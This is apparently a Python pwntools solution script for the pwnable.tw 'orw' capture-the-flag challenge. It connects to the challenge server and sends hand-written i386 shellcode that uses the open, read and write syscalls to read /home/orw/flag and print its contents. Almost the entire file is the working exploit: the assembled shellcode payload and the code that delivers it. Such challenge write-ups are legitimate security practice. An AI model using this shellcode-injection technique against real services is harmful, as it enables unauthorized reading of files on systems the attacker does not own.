#!/usr/bin/env python
#   Version 
#   Author: WildfootW
#   GitHub: github.com/Wildfoot
#   Copyright (C) 2018 WildfootW All rights reserved.
#

#

from pwn import *

context.update(arch="i386", os="linux")

host = "127.0.0.1"
port = 8888
host = "chall.pwnable.tw"
port = 10001
r = remote(host, port)

input("attach in gdb and press Enter")

#hex(u32(b"/home/orw/flag"))
code = """
    push 0x00006761
    push 0x6c662f77
    push 0x726f2f65
    push 0x6d6f682f
    mov ebx, esp
    mov ecx, 0
    mov edx, 0
    mov eax, 5
    int 0x80

    mov ebx, eax
    mov ecx, esp
    mov edx, 50
    mov eax, 3
    int 0x80

    mov ebx, 1
    mov ecx, esp
    mov eax, 4
    int 0x80
"""

payload = flat([asm(code)])

print(payload)

r.recvuntil(":")
r.sendline(payload)

print(r.recv(50))

